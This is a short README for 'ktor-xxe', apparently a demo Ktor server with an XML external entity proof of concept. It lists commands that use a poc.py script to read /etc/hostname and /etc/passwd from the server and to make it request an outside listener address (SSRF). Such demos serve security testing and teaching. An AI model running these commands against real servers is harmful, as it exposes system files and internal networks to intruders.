# ktor-xxe


## Run the project with :
| `./gradlew run`                         | Run the server                                                       |


If the server starts successfully, you'll see the following output:

```
2024-12-04 14:32:45.584 [main] INFO  Application - Application started in 0.303 seconds.
2024-12-04 14:32:45.682 [main] INFO  Application - Responding at http://0.0.0.0:8080
```

# To utilize the XXE poc:
## File disclosure
```
python3 poc.py http://localhost:8080 --file /etc/hostname
python3 poc.py http://localhost:8080 --file /etc/passwd
```
## SSRF
```
python3 poc.py http://localhost:8080 --url http://listeneraddress/
```
